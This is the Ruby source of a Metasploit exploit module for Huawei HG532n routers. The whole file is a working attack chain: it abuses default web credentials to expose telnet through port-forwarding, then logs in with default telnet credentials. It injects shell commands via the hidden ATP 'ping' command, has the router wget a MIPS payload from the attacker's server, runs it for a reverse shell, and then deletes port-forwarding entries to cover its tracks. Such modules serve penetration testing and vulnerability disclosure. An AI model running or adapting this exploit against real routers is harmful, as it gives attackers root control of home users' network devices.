##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(
      info,
      'Name'        => 'Huawei HG532n Command Injection',
      'Description' => %q(
        This module exploits a command injection vulnerability in the Huawei
        HG532n routers provided by TE-Data Egypt, leading to a root shell.

        The router's web interface has two kinds of logins, a "limited" user:user
        login given to all customers and an admin mode. The limited mode is used
        here to expose the router's telnet port to the outside world through NAT
        port-forwarding.

        With telnet now remotely accessible, the router's limited "ATP command
        line tool" (served over telnet) can be upgraded to a root shell through
        an injection into the ATP's hidden "ping" command.
      ),
      'Author'         =>
        [
          'Ahmed S. Darwish <darwish.07@gmail.com>',    # Vulnerability discovery, msf module
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => ['linux'],
      'Arch'           => ARCH_MIPSBE,
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'PAYLOAD' => 'linux/mipsbe/mettle_reverse_tcp'
        },
      'Targets'        =>
        [
          [
            'Linux mipsbe Payload',
            {
              'Arch'     => ARCH_MIPSBE,
              'Platform' => 'linux'
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 15 2017',
      'References' => [
        ['URL', 'https://github.com/rapid7/metasploit-framework/pull/8245']
      ]
    ))
    register_options(
      [
        OptString.new('HttpUsername', [false, 'Valid web-interface user-mode username', 'user']),
        OptString.new('HttpPassword', [false, 'Web-interface username password', 'user']),
        OptString.new('TelnetUsername', [false, 'Valid router telnet username', 'admin']),
        OptString.new('TelnetPassword', [false, 'Telnet username password', 'admin']),
        OptAddress.new('DOWNHOST', [false, 'Alternative host to request the MIPS payload from']),
        OptString.new('DOWNFILE', [false, 'Filename to download, (default: random)']),
        OptInt.new("ListenerTimeout", [true, "Number of seconds to wait for the exploit to connect back", 60])
      ], self.class
    )
  end

  def check
    httpd_fingerprint = %r{
      \A
      HTTP\/1\.1\s200\sOK\r\n
      CACHE-CONTROL:\sno-cache\r\n
      Date:\s.*\r\n
      Connection:\sKeep-Alive\r\n
      Content-Type:\stext\/html\r\n
      Content-Length:\s\d+\r\n
      \r\n
      <html>\n<head>\n
      <META\shttp-equiv="Content-Type"\scontent="text\/html;\scharset=UTF-8">\r\n
      <META\shttp-equiv="Pragma"\scontent="no-cache">\n
      <META\shttp-equiv="expires"\sCONTENT="-1">\n
      <link\srel="icon"\stype="image\/icon"\shref="\/favicon.ico"\/>
    }x

    begin
      res = send_request_raw(
        'method' => 'GET',
        'uri'    => '/'
      )
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Could not connect to device")
      return Exploit::CheckCode::Unknown
    end

    if res && res.code == 200 && res.to_s =~ httpd_fingerprint
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Unknown
  end

  #
  # The Javascript code sends all passwords in the form:
  #      form.setAction('/index/login.cgi');
  #      form.addParameter('Username', Username.value);
  #      form.addParameter('Password', base64encode(SHA256(Password.value)));
  # Do the same base64 encoding and SHA-256 hashing here.
  #
  def hash_password(password)
    sha256 = OpenSSL::Digest::SHA256.hexdigest(password)
    Base64.encode64(sha256).gsub(/\s+/, "")
  end

  #
  # Without below cookies, which are also sent by the JS code, the
  # server will consider even correct HTTP requests invalid
  #
  def generate_web_cookie(admin: false, session: nil)
    if admin
      cookie =  'FirstMenu=Admin_0; '
      cookie << 'SecondMenu=Admin_0_0; '
      cookie << 'ThirdMenu=Admin_0_0_0; '
    else
      cookie =  'FirstMenu=User_2; '
      cookie << 'SecondMenu=User_2_1; '
      cookie << 'ThirdMenu=User_2_1_0; '
    end

    cookie << 'Language=en'
    cookie << "; #{session}" unless session.nil?
    cookie
  end

  #
  # Login to the router through its JS-based login page. Upon a successful
  # login, return the keep-alive HTTP session cookie
  #
  def web_login
    cookie = generate_web_cookie(admin: true)

    # On good passwords, the router redirect us to the /html/content.asp
    # homepage. Otherwise, it throws us back to the '/' login page. Thus
    # consider the ASP page our valid login marker
    invalid_login_marker = "var pageName = '/'"
    valid_login_marker = "var pageName = '/html/content.asp'"

    username = datastore['HttpUsername']
    password = datastore['HttpPassword']

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => '/index/login.cgi',
      'cookie'    => cookie,
      'vars_post' => {
        'Username' => username,
        'Password' => hash_password(password)
      }
    )
    fail_with(Failure::Unreachable, "Connection timed out") if res.nil?

    unless res.code == 200
      fail_with(Failure::NotFound, "Router returned unexpected HTTP code #{res.code}")
    end

    return res.get_cookies if res.body.include? valid_login_marker

    if res.body.include? invalid_login_marker
      fail_with(Failure::NoAccess, "Invalid web interface credentials #{username}:#{password}")
    else
      fail_with(Failure::UnexpectedReply, "Neither valid or invalid login markers received")
    end
  end

  #
  # The telnet port is filtered by default. Expose it to the outside world
  # through NAT forwarding
  #
  def expose_telnet_port(session_cookies)
    cookie = generate_web_cookie(session: session_cookies)

    external_telnet_port = rand(32767) + 32768

    portmapping_page = '/html/application/portmapping.asp'
    valid_port_export_marker = "var pageName = '#{portmapping_page}';"
    invalid_port_export_marker = /var ErrInfo = \d+/

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => '/html/application/addcfg.cgi',
      'cookie'    => cookie,
      'headers'   => { 'Referer' => "http://#{rhost}#{portmapping_page}" },
      'vars_get'  => {
        'x'           => 'InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.PortMapping',
        'RequestFile' => portmapping_page
      },
      'vars_post' => {
        'x.PortMappingProtocol'    => "TCP",
        'x.PortMappingEnabled'     => "1",
        'x.RemoteHost'             => "",
        'x.ExternalPort'           => external_telnet_port.to_s,
        'x.ExternalPortEndRange'   => external_telnet_port.to_s,
        'x.InternalClient'         => "192.168.1.1",
        'x.InternalPort'           => "23",
        'x.PortMappingDescription' => Rex::Text.rand_text_alpha(10) # Minimize any possible conflict
      }
    )
    fail_with(Failure::Unreachable, "Connection timed out") if res.nil?

    unless res.code == 200
      fail_with(Failure::NotFound, "Router returned unexpected HTTP code #{res.code}")
    end

    if res.body.include? valid_port_export_marker
      print_good "Telnet port forwarding succeeded; exposed telnet port = #{external_telnet_port}"
      return external_telnet_port
    end

    if res.body.match? invalid_port_export_marker
      fail_with(Failure::Unknown, "Router reported port-mapping error. " \
                "A port-forwarding entry with same external port (#{external_telnet_port}) already exist?")
    end

    fail_with(Failure::UnexpectedReply, "Port-forwarding failed: neither valid or invalid markers received")
  end

  #
  # Cover our tracks; don't leave the exposed router's telnet port open
  #
  def hide_exposed_telnet_port(session_cookies)
    cookie = generate_web_cookie(session: session_cookies)
    portmapping_page = '/html/application/portmapping.asp'

    # Gather a list of all existing ports forwarded so we can purge them soon
    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => portmapping_page,
      'cookie'    => cookie
    )

    unless res && res.code == 200
      print_warning "Could not get current forwarded ports from web interface"
    end

    # Collect existing port-forwarding keys; to be passed to the delete POST request
    portforward_key = /InternetGatewayDevice\.WANDevice\.1\.WANConnectionDevice\.1\.WANPPPConnection\.1\.PortMapping\.\d+/
    vars_post = {}
    res.body.scan(portforward_key).uniq.each do |key|
      vars_post[key] = ""
    end

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => '/html/application/del.cgi',
      'cookie'    => cookie,
      'headers'   => { 'Referer' => "http://#{rhost}#{portmapping_page}" },
      'vars_get'  => { 'RequestFile' => portmapping_page },
      'vars_post' => vars_post
    )
    return if res && res.code == 200

    print_warning "Could not re-hide exposed telnet port"
  end

  #
  # Cleanup our state, after any successful web login. Note: router refuses
  # more than 3 concurrent logins from the same IP. It also forces a 1-minute
  # delay after 3 unsuccessful logins from _any_ IP.
  #
  def web_logout(session_cookies)
    cookie = generate_web_cookie(admin: true, session: session_cookies)

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => '/index/logout.cgi',
      'cookie'    => cookie,
      'headers'   => { 'Referer' => "http://#{rhost}/html/main/logo.html" }
    )
    return if res && res.code == 200

    print_warning "Could not logout from web interface. Future web logins may fail!"
  end

  #
  # Don't leave web sessions idle for too long (> 1 second). It triggers the
  # HTTP server's safety mechanisms and make it refuse further operations.
  #
  # Thus do all desired web operations in chunks: log in, do our stuff (passed
  # block), and immediately log out. The router's own javescript code handles
  # this by sending a refresh request every second.
  #
  def web_operation
    begin
      cookie = web_login
      yield cookie
    ensure
      web_logout(cookie) unless cookie.nil?
    end
  end

  #
  # Helper method. Used for waiting on telnet banners and prompts.
  # Always catch the ::Timeout::Error exception upon calling this.
  #
  def read_until(sock, timeout, marker)
    received = ''
    Timeout.timeout(timeout) do
      loop do
        r = (sock.get_once(-1, 1) || '')
        next if r.empty?

        received << r
        print_status "Received new reply token = '#{r.strip}'" if datastore['VERBOSE'] == true
        return received if received.include? marker
      end
    end
  end

  #
  # Borrowing constants from Ruby's Net::Telnet class (ruby license)
  #
  IAC         =  255.chr   # "\377" # "\xff" # interpret as command
  DO          =  253.chr   # "\375" # "\xfd" # please, you use option
  OPT_BINARY  =  0.chr     # "\000" # "\x00" # Binary Transmission
  OPT_ECHO    =  1.chr     # "\001" # "\x01" # Echo
  OPT_SGA     =  3.chr     # "\003" # "\x03" # Suppress Go Ahead
  OPT_NAOFFD  =  13.chr    # "\r"   # "\x0d" # Output Formfeed Disposition

  def telnet_auth_negotiation(sock, timeout)
    begin
      read_until(sock, timeout, 'Password:')
      sock.write(IAC + DO + OPT_ECHO + IAC + DO + OPT_SGA)
    rescue ::Timeout::Error
      fail_with(Failure::UnexpectedReply, "Expected first password banner not received")
    end

    begin
      read_until(sock, timeout, 'Password:') # Router bug
      sock.write(datastore['TelnetPassword'] + OPT_NAOFFD + OPT_BINARY)
    rescue ::Timeout::Error
      fail_with(Failure::UnexpectedReply, "Expected second password banner not received")
    end
  end

  def telnet_prompt_wait(error_regex = nil)
    begin
      result = read_until(@telnet_sock, @telnet_timeout, @telnet_prompt)
      if error_regex
        error_regex = [error_regex] unless error_regex.is_a? Array
        error_regex.each do |regex|
          if result.match? regex
            fail_with(Failure::UnexpectedReply, "Error expression #{regex} included in reply")
          end
        end
      end
    rescue ::Timeout::Error
      fail_with(Failure::UnexpectedReply, "Expected telnet prompt '#{@telnet_prompt}' not received")
    end
  end

  #
  # Basic telnet login. Due to mixins conflict, revert to using plain
  # Rex sockets (thanks @hdm!)
  #
  def telnet_login(port)
    print_status "Connecting to just-exposed telnet port #{port}"

    @telnet_prompt = 'HG520b>'
    @telnet_timeout = 60

    @telnet_sock = Rex::Socket.create_tcp(
      'PeerHost' => rhost,
      'PeerPort' => port,
      'Context'  => { 'Msf' => framework, 'MsfExploit' => self },
      'Timeout'  => @telnet_timeout
    )
    if @telnet_sock.nil?
      fail_with(Failure::Unreachable, "Exposed telnet port unreachable")
    end
    add_socket(@telnet_sock)

    print_good "Connection succeeded. Passing telnet credentials"
    telnet_auth_negotiation(@telnet_sock, @telnet_timeout)

    print_good "Credentials passed; waiting for prompt '#{@telnet_prompt}'"
    telnet_prompt_wait

    print_good 'Prompt received. Telnet access fully granted!'
  end

  def telnet_exit
    return if @telnet_sock.nil?
    @telnet_sock.write('exit' + OPT_NAOFFD + OPT_BINARY)
  end

  #
  # Router's limited ATP shell just reverts to classical Linux
  # shell when executing a ping:
  #
  #       "ping %s > /var/res_ping"
  #
  # A successful injection would thus substitute all its spaces to
  # ${IFS}, and trails itself with ";true" so it can have its own
  # IO redirection.
  #
  def execute_command(command, error_regex = nil, background: false)
    print_status "Running command on target: #{command}"

    command.gsub!(/\s/, '${IFS}')
    separator = background ? '&' : ';'
    atp_cmd = "ping ?;#{command}#{separator}true"

    @telnet_sock.write(atp_cmd + OPT_NAOFFD + OPT_BINARY)
    telnet_prompt_wait(error_regex)
    print_good "Command executed successfully"
  end

  #
  # Our own HTTP server, for serving the payload
  #
  def start_http_server
    @pl = generate_payload_exe

    downfile = datastore['DOWNFILE'] || rand_text_alpha(8 + rand(8))
    resource_uri = '/' + downfile

    if datastore['DOWNHOST']
      print_status "Will not start local web server, as DOWNHOST is already defined"
    else
      print_status("Starting web server; hosting #{resource_uri}")
      start_service(
        'ServerHost' => '0.0.0.0',
        'Uri' => {
          'Proc' => proc { |cli, req| on_request_uri(cli, req) },
          'Path' => resource_uri
        }
      )
    end

    resource_uri
  end

  #
  # HTTP server incoming request callback
  #
  def on_request_uri(cli, _request)
    print_good "HTTP server received request. Sending payload to victim"
    send_response(cli, @pl)
  end

  #
  # Unfortunately we could not use the `echo' command stager since
  # the router's busybox echo does not understand the necessary
  # "-en" options. It outputs them to the binary instead.
  #
  # We could not also use the `wget' command stager, as Huawei
  # crafted their own implementation with much different params.
  #
  def download_and_run_payload(payload_uri)
    srv_host =
      if datastore['DOWNHOST']
        datastore['DOWNHOST']
      elsif datastore['SRVHOST'] == "0.0.0.0" || datastore['SRVHOST'] == "::"
        Rex::Socket.source_address(rhost)
      else
        datastore['SRVHOST']
      end

    srv_port = datastore['SRVPORT'].to_s
    output_file = "/tmp/#{rand_text_alpha_lower(8)}"

    # Check module documentation for the special wget syntax
    wget_cmd = "wget -g -v -l #{output_file} -r #{payload_uri} -P#{srv_port} #{srv_host}"

    execute_command(wget_cmd, [/cannot connect/, /\d+ error/]) # `404 error', etc.
    execute_command("chmod 700 #{output_file}", /No such file/)
    execute_command(output_file, /not found/, background: true)
    execute_command("rm #{output_file}", /No such file/)
  end

  #
  # At the end of the module, especially for reverse_tcp payloads, wait for
  # the payload to connect back to us.  There's a very high probability we
  # will lose the payload's signal otherwise.
  #
  def wait_for_payload_session
    print_status "Waiting for the payload to connect back .."
    begin
      Timeout.timeout(datastore['ListenerTimeout']) do
        loop do
          break if session_created?
          Rex.sleep(0.25)
        end
      end
    rescue ::Timeout::Error
      fail_with(Failure::Unknown, "Timeout waiting for payload to start/connect-back")
    end
    print_good "Payload connected!"
  end

  #
  # Main exploit code: login through web interface; port-forward router's
  # telnet; access telnet and gain root shell through command injection.
  #
  def exploit
    print_status "Validating router's HTTP server (#{rhost}:#{rport}) signature"
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::Unknown, "Unable to validate device fingerprint. Is it an HG532n?")
    end

    print_good "Good. Router seems to be a vulnerable HG532n device"

    telnet_port = nil
    web_operation do |cookie|
      telnet_port = expose_telnet_port(cookie)
    end

    begin
      telnet_login(telnet_port)
      payload_uri = start_http_server
      download_and_run_payload(payload_uri)
      wait_for_payload_session
    ensure
      telnet_exit
      web_operation do |cookie|
        hide_exposed_telnet_port(cookie)
      end
    end
  end
end